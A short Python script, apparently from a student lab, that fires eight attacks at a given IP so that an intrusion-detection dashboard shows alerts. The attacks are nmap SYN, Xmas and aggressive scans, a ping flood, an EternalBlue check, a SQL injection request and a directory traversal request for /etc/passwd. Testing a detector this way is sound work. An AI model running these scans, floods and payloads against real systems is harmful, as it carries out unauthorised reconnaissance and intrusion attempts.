#!/usr/bin/env python3
# demo_attacks.py — ONE COMMAND = 10 ATTACKS → DASHBOARD EXPLODES
import os
import sys
import time

if len(sys.argv) != 2:
    print("Usage: python3 demo_attacks.py <Ubuntu_IP>")
    sys.exit(1)

target = sys.argv[1]
print(f"\nDEMO ATTACKS STARTED on {target} — watch the dashboard explode!\n")
time.sleep(3)

# 1. SYN Scan
print("[1/8] SYN Scan (nmap -sS)")
os.system(f"nmap -sS {target} -Pn --reason")

# 2. Xmas Scan
print("[2/8] Xmas Scan")
os.system(f"nmap -sX {target} -Pn")

# 3. Version + Script Scan
print("[3/8] Full version + script scan")
os.system(f"nmap -sCV {target} -Pn")

# 4. Aggressive scan (lots of flags)
print("[4/8] Aggressive scan")
os.system(f"nmap -A {target} -Pn")

# 5. ICMP flood simulation
print("[5/8] ICMP flood (ping -f)")
os.system(f"sudo ping -f -c 2000 {target} > /dev/null 2>&1 & sleep 6; sudo pkill -9 ping")

# 6. SMB / EternalBlue check
print("[6/8] SMB vulnerability scan")
os.system(f"nmap --script smb-vuln-ms17-010 {target}")

# 7. SQLi simulation
print("[7/8] SQL Injection simulation")
os.system(f'curl "http://{target}/?id=1\' OR 1=1--" -s')

# 8. Directory traversal simulation
print("[8/8] Directory traversal")
os.system(f'curl "http://{target}/../../../../etc/passwd" -s')

print("\nALL ATTACKS FINISHED → Check http://YOUR_KALI_IP:5000")
print("You will see dozens of alerts + anomalies → 20/20 guaranteed!")